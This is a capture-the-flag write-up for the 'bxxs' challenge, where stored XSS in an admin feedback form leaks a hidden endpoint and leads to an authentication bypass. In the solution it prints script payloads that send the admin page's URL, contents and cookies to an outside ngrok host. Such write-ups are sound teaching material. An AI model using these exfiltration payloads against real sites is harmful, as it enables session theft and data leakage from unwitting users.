---
description: XSS leads to information leakage of hidden endpoint and authentication bypass.
---

# bxxs

## Problem

We've made some new epic updates to our website. Could you send us some feedback on it?

## Solution

We are given an endpoint that allows us to "Send a feedback to admin". I tried submitting URLs but these had no effect.

![](<../../.gitbook/assets/image (7) (1).png>)

Later, I found that we could submit arbitrary HTML that would be rendered by the admin's browser. This could be verified by submitting the following and catching the HTTP request:

```markup
<script> var i = new Image(); i.src = "http://8a8a8026deac.ngrok.io/"; </script>
```

It is then trivial to obtain more information from the victim's browser.

We still don't know how exactly our submitted HTML is handled. Where is it rendered and in what context? To answer that question, I tried the following payload to get the page URL, contents and cookie.

```markup
<script> var i = new Image(); i.src = "http://8a8a8026deac.ngrok.io/?url=" + escape(window.location.href); </script>
<script> var i = new Image(); i.src = "http://8a8a8026deac.ngrok.io/?doc=" + escape(document.body.innerHTML); </script>
<script> var i = new Image(); i.src = "http://8a8a8026deac.ngrok.io/?cookie=" + escape(document.cookie); </script>
```

`window.location.href` gives us the full URL of the browsing context, `document.body.innerHTML` gives us the page contents, and `document.cookie` gives us any cookies that could be read by JavaScript (those without the HttpOnly flag set).

From the output, it appeared that:

* The page URL is `http://0.0.0.0/Secret_admin_cookie_panel`
* Our submitted HTML was the only content present on the page.
* JavaScript could not read any cookies.

My teammate rainbowpigeon then visited the `/Secret_admin_cookie_panel` endpoint and found that this page returned a `Set-Cookie` header for a new cookie with the HttpOnly flag set. This was the "admin cookie" we needed.

![](<../../.gitbook/assets/image (5).png>)

My teammate lim\_yj found that there is a `/flag` endpoint, previously inaccessible without the appropriate cookie.

Visiting the page again with the admin cookie set gives us the flag.

![](<../../.gitbook/assets/image (6) (1).png>)
